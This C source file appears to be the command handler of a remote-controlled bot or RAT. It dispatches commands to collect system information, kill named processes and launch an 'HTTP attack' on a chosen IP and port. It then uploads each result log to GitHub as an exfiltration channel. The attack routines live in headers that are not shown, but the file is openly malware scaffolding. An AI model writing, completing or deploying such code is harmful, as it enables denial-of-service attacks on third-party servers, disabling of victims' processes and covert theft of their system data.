#include <string.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <io.h>
#include <fcntl.h>

#include "info_advanced.h"
#include "killer_enum.h"
#include "http_attack.h"
#include "upload.h"

void generate_filename(char* out, size_t size) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    snprintf(out, size, "%d-%02d-%02d_%02d-%02d-%02d.txt",
             t->tm_year+1900, t->tm_mon+1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec);
}

void handle_feature(const char* cmd) {
    char log[8192] = {0};
    char filename[128];
    generate_filename(filename, sizeof(filename));

    if (strncmp(cmd, "feature:info", 12) == 0) {
        FILE* tmp = fopen("temp_log.txt", "w+");
        if (tmp) {
            fflush(stdout);
            int old_fd = _dup(_fileno(stdout));
            _dup2(_fileno(tmp), _fileno(stdout));

            feature_info_advanced();

            fflush(stdout);
            _dup2(old_fd, _fileno(stdout));
            close(old_fd);

            rewind(tmp);
            fread(log, 1, sizeof(log) - 1, tmp);
            fclose(tmp);
            remove("temp_log.txt");
        } else {
            snprintf(log, sizeof(log), "Cannot open temp file.\n");
        }
    } else if (strncmp(cmd, "feature:killer", 14) == 0) {
        const char* proc = strchr(cmd, ' ');
        if (proc && strlen(proc + 1) > 0) {
            feature_killer_enum(proc + 1);
            snprintf(log, sizeof(log), "Executed killer on: %s\n", proc + 1);
        } else {
            snprintf(log, sizeof(log), "No process name given.\n");
        }
    } else if (strncmp(cmd, "feature:attack", 14) == 0) {
        const char* args = strchr(cmd, ' ');
        if (args) {
            char ip[64] = {0};
            int port = 80;
            sscanf(args + 1, "%63s %d", ip, &port);
            if (strlen(ip) > 0) {
                feature_http_attack(ip, port);
                snprintf(log, sizeof(log), "Launched HTTP attack on %s:%d\n", ip, port);
            } else {
                snprintf(log, sizeof(log), "Invalid IP target.\n");
            }
        } else {
            snprintf(log, sizeof(log), "Missing IP and port.\n");
        }
    } else {
        snprintf(log, sizeof(log), "Unknown feature command.\n");
    }

    if (strlen(log) > 0) {
        int success = upload_result_to_github(log, filename);
        printf(success ? "[+] Uploaded: %s\n" : "[-] Upload failed: %s\n", filename);
    }
}
